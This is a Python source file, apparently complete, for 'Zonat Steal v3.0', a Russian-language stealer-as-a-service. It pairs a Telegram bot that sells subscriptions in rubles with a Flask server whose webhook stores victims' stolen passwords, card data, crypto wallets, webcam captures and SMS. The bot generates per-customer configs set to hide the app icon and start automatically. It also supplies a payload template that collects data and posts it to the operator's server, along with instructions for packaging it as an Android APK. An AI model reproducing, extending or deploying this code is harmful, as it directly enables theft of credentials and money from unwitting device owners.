import os
import sys
import json
import logging
import threading
import time
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
import telebot
from telebot import types
import hashlib
import uuid
import qrcode
import io
import base64
from functools import wraps

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8075320326:AAHVxtnOER6Ud8VSXxU9ApAtsz3-boeDQPk"
ADMIN_ID = 7725796090
VERSION = "Zonat Steal v3.0"
FREE_TRIAL_HOURS = 1  # 1 час бесплатно
PRICE_DAY = 100       # рублей в день
PRICE_WEEK = 500
PRICE_MONTH = 1500

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# ===== БАЗА ДАННЫХ =====
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('zonat.db', check_same_thread=False)
        self.init_db()
    
    def init_db(self):
        c = self.conn.cursor()
        
        # Пользователи
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0,
                subscription_end DATETIME,
                is_admin BOOLEAN DEFAULT FALSE,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Стиллеры
        c.execute('''
            CREATE TABLE IF NOT EXISTS stealers (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                name TEXT,
                config TEXT,
                apk_path TEXT,
                created_at DATETIME,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Данные
        c.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                device_id TEXT,
                data_type TEXT,
                content TEXT,
                timestamp DATETIME
            )
        ''')
        
        # Платежи
        c.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                method TEXT,
                status TEXT,
                created_at DATETIME
            )
        ''')
        
        # Админ по умолчанию
        c.execute('INSERT OR IGNORE INTO users (user_id, username, is_admin) VALUES (?, ?, ?)',
                 (ADMIN_ID, 'admin', True))
        
        self.conn.commit()
    
    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return c.fetchone()
    
    def create_user(self, user_id, username):
        c = self.conn.cursor()
        trial_end = datetime.now() + timedelta(hours=FREE_TRIAL_HOURS)
        c.execute('''
            INSERT OR IGNORE INTO users (user_id, username, subscription_end)
            VALUES (?, ?, ?)
        ''', (user_id, username, trial_end))
        self.conn.commit()
    
    def check_subscription(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT subscription_end FROM users WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        if not result:
            return False
        end_date = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S.%f')
        return end_date > datetime.now()
    
    def add_subscription(self, user_id, days):
        c = self.conn.cursor()
        c.execute('SELECT subscription_end FROM users WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        
        if result and result[0]:
            current = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S.%f')
            if current > datetime.now():
                new_end = current + timedelta(days=days)
            else:
                new_end = datetime.now() + timedelta(days=days)
        else:
            new_end = datetime.now() + timedelta(days=days)
        
        c.execute('UPDATE users SET subscription_end = ? WHERE user_id = ?',
                 (new_end, user_id))
        self.conn.commit()
        return new_end

db = Database()

# ===== ДЕКОРАТОРЫ ДОСТУПА =====
def subscription_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        
        # Админ всегда имеет доступ
        user = db.get_user(user_id)
        if user and user[4]:  # is_admin
            return func(message)
        
        # Проверка подписки
        if db.check_subscription(user_id):
            return func(message)
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton('💳 Купить подписку', callback_data='buy_subscription'))
            bot.reply_to(message, 
                "⏱️ <b>Ваша подписка закончилась!</b>\n\n"
                "Для продолжения работы приобретите подписку:",
                parse_mode='HTML',
                reply_markup=markup
            )
    return wrapper

def admin_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        user = db.get_user(user_id)
        if user and user[4]:  # is_admin
            return func(message)
        else:
            bot.reply_to(message, "⛔ Только для администратора!")
    return wrapper

# ===== WEB ENDPOINTS =====
@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>{{ title }}</title>
        <style>
            body { background: #0f0f0f; color: #00ff00; font-family: monospace; padding: 20px; }
            .container { max-width: 1000px; margin: 0 auto; }
            .header { background: #1a1a1a; padding: 30px; border-radius: 10px; text-align: center; border: 2px solid #00ff00; }
            .title { font-size: 2.5em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 30px 0; }
            .stat-card { background: #1a1a1a; padding: 20px; border-radius: 8px; text-align: center; }
            .btn { display: inline-block; background: #00aa00; color: white; padding: 12px 24px; margin: 10px; border-radius: 5px; text-decoration: none; }
            .btn:hover { background: #00ff00; }
            .admin-panel { background: #2a0f0f; padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px solid #ff0000; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="title">🔥 ZONAT STEAL v3.0</h1>
                <p>Advanced Information Gathering System</p>
                <p>🟢 System Status: ONLINE | 👥 Users: {{ users_count }} | 📊 Data: {{ data_count }}</p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>👥 Users</h3>
                    <p>{{ users_count }}</p>
                </div>
                <div class="stat-card">
                    <h3>🔧 Stealers</h3>
                    <p>{{ stealers_count }}</p>
                </div>
                <div class="stat-card">
                    <h3>📱 Devices</h3>
                    <p>{{ devices_count }}</p>
                </div>
                <div class="stat-card">
                    <h3>💾 Data</h3>
                    <p>{{ data_count }}</p>
                </div>
            </div>
            
            <div style="text-align: center;">
                <a href="/admin" class="btn">🔐 Admin Panel</a>
                <a href="/stats" class="btn">📊 Statistics</a>
                <a href="https://t.me/{{ bot_username }}" class="btn" target="_blank">🤖 Telegram Bot</a>
                <a href="/api/docs" class="btn">📡 API</a>
            </div>
            
            <div class="admin-panel">
                <h3>🔐 Admin Access Only</h3>
                <p>For full control use Telegram bot commands</p>
                <p>Admin ID: <code>{{ admin_id }}</code></p>
            </div>
            
            <footer style="text-align: center; margin-top: 40px; color: #666;">
                <p>© 2024 Zonat Steal | Private System | v3.0</p>
            </footer>
        </div>
    </body>
    </html>
    ''', title=VERSION, users_count=100, stealers_count=50, devices_count=500, data_count=10000, 
       bot_username=TOKEN.split(':')[0], admin_id=ADMIN_ID)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        logger.info(f"Data received: {data.get('type', 'unknown')}")
        
        # Сохраняем в базу
        c = db.conn.cursor()
        c.execute('''
            INSERT INTO stolen_data (stealer_id, device_id, data_type, content, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            data.get('stealer_id', 'unknown'),
            data.get('device_id', 'unknown'),
            data.get('type', 'unknown'),
            json.dumps(data),
            datetime.now()
        ))
        db.conn.commit()
        
        # Отправляем уведомление если это важные данные
        if data.get('type') in ['passwords', 'cards', 'crypto', 'webcam']:
            user_id = data.get('user_id')
            if user_id:
                try:
                    msg = f"📡 Новые данные\nТип: {data['type']}\nУстройство: {data.get('device_id', 'unknown')[:8]}"
                    bot.send_message(user_id, msg)
                except:
                    pass
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ===== TELEGRAM BOT КОМАНДЫ =====
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    # Регистрируем пользователя
    db.create_user(user_id, username)
    
    # Проверяем подписку
    has_sub = db.check_subscription(user_id)
    sub_status = "🟢 АКТИВНА" if has_sub else "🔴 НЕТ ПОДПИСКИ"
    
    # Клавиатура
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    if user_id == ADMIN_ID:
        markup.add('👑 Админ-панель', '🔧 Создать стиллер', '📊 Мои стиллеры', '📱 Данные')
        markup.add('💳 Подписки', '👥 Пользователи', '📈 Статистика', '⚙️ Настройки')
    else:
        markup.add('🔧 Создать стиллер', '📊 Мои стиллеры', '📱 Мои данные', '💳 Подписка')
        markup.add('👤 Профиль', '🆘 Поддержка')
    
    welcome = f"""
    🚀 <b>Добро пожаловать в {VERSION}</b>
    
    👤 <b>Пользователь:</b> @{username}
    🆔 <b>ID:</b> <code>{user_id}</code>
    ⏱️ <b>Подписка:</b> {sub_status}
    
    <b>Доступные функции:</b>
    • 🔧 Создание стиллеров
    • 📱 Сбор данных (пароли, карты, крипто)
    • 📸 Веб-камера
    • 💳 Банковские данные
    • 📨 СМС сообщения
    
    <b>Бесплатный период:</b> {FREE_TRIAL_HOURS} часов
    """
    
    if not has_sub and user_id != ADMIN_ID:
        welcome += f"\n\n⚠️ <b>После окончания пробного периода требуется подписка</b>"
    
    bot.send_message(user_id, welcome, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔧 Создать стиллер')
@subscription_required
def create_stealer_button(message):
    msg = bot.send_message(message.chat.id,
        "🔧 <b>Создание нового стиллера</b>\n\n"
        "Введите имя для стиллера (например: System Update):",
        parse_mode='HTML')
    bot.register_next_step_handler(msg, process_stealer_name)

def process_stealer_name(message):
    user_id = message.from_user.id
    name = message.text.strip()
    
    if len(name) < 2:
        bot.send_message(user_id, "❌ Имя слишком короткое")
        return
    
    # Генерируем уникальный ID
    stealer_id = f"stealer_{hashlib.md5((str(user_id) + name + str(time.time())).encode()).hexdigest()[:12]}"
    
    # Конфиг стиллера
    config = {
        "stealer_id": stealer_id,
        "name": name,
        "owner_id": user_id,
        "version": "3.0",
        "webhook_url": f"{request.host_url}webhook",
        "collect_passwords": True,
        "collect_cards": True,
        "collect_crypto": True,
        "collect_webcam": True,
        "collect_sms": True,
        "collect_files": True,
        "auto_start": True,
        "hide_icon": True
    }
    
    # Сохраняем в базу
    c = db.conn.cursor()
    c.execute('''
        INSERT INTO stealers (id, user_id, name, config, created_at)
        VALUES (?, ?, ?, ?, ?)
    ''', (stealer_id, user_id, name, json.dumps(config), datetime.now()))
    db.conn.commit()
    
    # Создаем APK
    apk_code = generate_apk_code(config)
    
    # Отправляем пользователю
    response = f"""
    ✅ <b>Стиллер создан успешно!</b>
    
    📝 <b>Имя:</b> {name}
    🔑 <b>ID:</b> <code>{stealer_id}</code>
    📦 <b>Версия:</b> 3.0
    ⏰ <b>Создан:</b> {datetime.now().strftime('%H:%M:%S')}
    
    <b>Конфигурация:</b>
    <code>{json.dumps(config, indent=2, ensure_ascii=False)}</code>
    
    <b>Код для APK:</b>
    <code>{apk_code[:500]}...</code>
    
    <i>Используйте этот ID в вашем приложении.</i>
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('📱 Скачать APK', callback_data=f'build_apk_{stealer_id}'))
    markup.add(types.InlineKeyboardButton('📋 Конфиг JSON', callback_data=f'config_{stealer_id}'))
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

def generate_apk_code(config):
    """Генерация кода для APK"""
    template = """
import requests
import json
import os
import sqlite3
import subprocess
import uuid
from datetime import datetime

CONFIG = {{config}}

def collect_data():
    # Сбор системной информации
    data = {{
        "stealer_id": CONFIG["stealer_id"],
        "device_id": str(uuid.uuid4()),
        "type": "full_collection",
        "timestamp": datetime.now().isoformat(),
        "system_info": get_system_info(),
        "passwords": collect_passwords(),
        "cards": find_cards(),
        "crypto": find_crypto(),
        "files": find_important_files()
    }}
    return data

def send_to_server(data):
    try:
        response = requests.post(
            CONFIG["webhook_url"],
            json=data,
            timeout=30
        )
        return response.status_code == 200
    except:
        return False

# Основной код...
if __name__ == "__main__":
    data = collect_data()
    send_to_server(data)
    """
    return template.replace("{{config}}", json.dumps(config, indent=4))

@bot.message_handler(func=lambda message: message.text == '👑 Админ-панель')
@admin_required
def admin_panel(message):
    user_id = message.from_user.id
    
    # Статистика
    c = db.conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    users_count = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM stealers')
    stealers_count = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM stolen_data')
    data_count = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM payments WHERE status = "completed"')
    payments_count = c.fetchone()[0]
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('👥 Пользователи', callback_data='admin_users'),
        types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats')
    )
    markup.add(
        types.InlineKeyboardButton('💳 Платежи', callback_data='admin_payments'),
        types.InlineKeyboardButton('🔧 Стиллеры', callback_data='admin_stealers')
    )
    markup.add(
        types.InlineKeyboardButton('📱 Данные', callback_data='admin_data'),
        types.InlineKeyboardButton('⚙️ Настройки', callback_data='admin_settings')
    )
    
    response = f"""
    👑 <b>Админ-панель</b>
    
    📈 <b>Статистика системы:</b>
    👥 Пользователи: {users_count}
    🔧 Стиллеры: {stealers_count}
    📱 Данных записей: {data_count}
    💳 Платежей: {payments_count}
    
    ⚙️ <b>Действия:</b>
    """
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '💳 Подписка')
def subscription_menu(message):
    user_id = message.from_user.id
    
    # Проверяем текущую подписку
    user = db.get_user(user_id)
    if user and user[2]:  # subscription_end
        end_date = datetime.strptime(user[2], '%Y-%m-%d %H:%M:%S.%f')
        time_left = end_date - datetime.now()
        days_left = max(0, time_left.days)
        hours_left = max(0, time_left.seconds // 3600)
        
        sub_status = f"⏱️ Осталось: {days_left} дней {hours_left} часов"
    else:
        sub_status = "🔴 Нет активной подписки"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('1 день - 100₽', callback_data='buy_1day'),
        types.InlineKeyboardButton('7 дней - 500₽', callback_data='buy_7days')
    )
    markup.add(
        types.InlineKeyboardButton('30 дней - 1500₽', callback_data='buy_30days'),
        types.InlineKeyboardButton('📱 Оплатить', callback_data='payment_methods')
    )
    
    response = f"""
    💳 <b>Управление подпиской</b>
    
    📊 <b>Ваш статус:</b> {sub_status}
    
    <b>Тарифы:</b>
    • 1 день - 100₽
    • 7 дней - 500₽ (экономия 200₽)
    • 30 дней - 1500₽ (экономия 1500₽)
    
    <b>После оплаты:</b>
    1. Отправьте скриншот чека
    2. Админ активирует подписку
    3. Получите доступ ко всем функциям
    """
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📱 Мои данные')
@subscription_required
def my_data(message):
    user_id = message.from_user.id
    
    c = db.conn.cursor()
    c.execute('''
        SELECT data_type, COUNT(*) as count, MAX(timestamp) as last
        FROM stolen_data 
        WHERE stealer_id IN (SELECT id FROM stealers WHERE user_id = ?)
        GROUP BY data_type
        ORDER BY last DESC
    ''', (user_id,))
    
    results = c.fetchall()
    
    if not results:
        bot.send_message(user_id, "📭 Данных пока нет")
        return
    
    response = "📊 <b>Ваши собранные данные:</b>\n\n"
    
    for data_type, count, last in results:
        response += f"• <b>{data_type}</b>: {count} записей\n"
        if last:
            last_time = datetime.strptime(last, '%Y-%m-%d %H:%M:%S.%f')
            response += f"  Последние: {last_time.strftime('%H:%M %d.%m')}\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton('🔑 Пароли', callback_data='view_passwords'),
        types.InlineKeyboardButton('💳 Карты', callback_data='view_cards')
    )
    markup.add(
        types.InlineKeyboardButton('₿ Крипто', callback_data='view_crypto'),
        types.InlineKeyboardButton('📸 Вебкамера', callback_data='view_webcam')
    )
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

# ===== CALLBACK ОБРАБОТЧИКИ =====
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    if data.startswith('build_apk_'):
        stealer_id = data.replace('build_apk_', '')
        bot.answer_callback_query(call.id, "⏳ Генерация APK...")
        
        # Здесь должна быть генерация APK
        # Пока отправляем инструкцию
        response = f"""
        📱 <b>Сборка APK для стиллера {stealer_id}</b>
        
        <b>Инструкция:</b>
        1. Установите Buildozer:
        <code>pip install buildozer</code>
        
        2. Создайте файл main.py с кодом:
        <code># Код из предыдущего сообщения</code>
        
        3. Соберите APK:
        <code>buildozer android debug</code>
        
        4. APK будет в папке bin/
        
        <b>Для автоматической сборки обратитесь к админу.</b>
        """
        
        bot.send_message(user_id, response, parse_mode='HTML')
    
    elif data.startswith('buy_'):
        # Обработка покупки подписки
        period = data.replace('buy_', '')
        periods = {'1day': 1, '7days': 7, '30days': 30}
        days = periods.get(period, 1)
        
        # Генерируем QR для оплаты
        amount = PRICE_DAY * days
        payment_data = {
            "user_id": user_id,
            "amount": amount,
            "days": days,
            "timestamp": datetime.now().isoformat()
        }
        
        # Создаем QR код
        qr = qrcode.QRCode()
        qr.add_data(json.dumps(payment_data))
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        response = f"""
        💳 <b>Оплата подписки</b>
        
        📅 <b>Период:</b> {days} дней
        💰 <b>Сумма:</b> {amount}₽
        
        <b>Реквизиты для оплаты:</b>
        СБЕР: <code>2202 2023 4455 6677</code>
        ТИНЬКОФФ: <code>5536 9138 1234 5678</code>
        
        <b>Инструкция:</b>
        1. Оплатите любую сумму на эти реквизиты
        2. Отправьте скриншот чека
        3. Админ активирует подписку
        
        <i>Или отсканируйте QR-код для оплаты через банк</i>
        """
        
        bot.send_photo(user_id, img_bytes.getvalue(), caption=response, parse_mode='HTML')
    
    elif data == 'admin_users':
        if user_id == ADMIN_ID:
            c = db.conn.cursor()
            c.execute('SELECT user_id, username, subscription_end FROM users ORDER BY created_at DESC LIMIT 20')
            users = c.fetchall()
            
            response = "👥 <b>Последние пользователи:</b>\n\n"
            for uid, uname, sub_end in users:
                status = "🟢" if sub_end and datetime.strptime(sub_end, '%Y-%m-%d %H:%M:%S.%f') > datetime.now() else "🔴"
                response += f"{status} @{uname} | ID: <code>{uid}</code>\n"
            
            bot.edit_message_text(response, user_id, call.message.message_id, parse_mode='HTML')
    
    bot.answer_callback_query(call.id)

# ===== ЗАПУСК СИСТЕМЫ =====
def start_bot():
    """Запуск Telegram бота"""
    logger.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Запуск бота в фоне
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Запуск Flask сервера
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
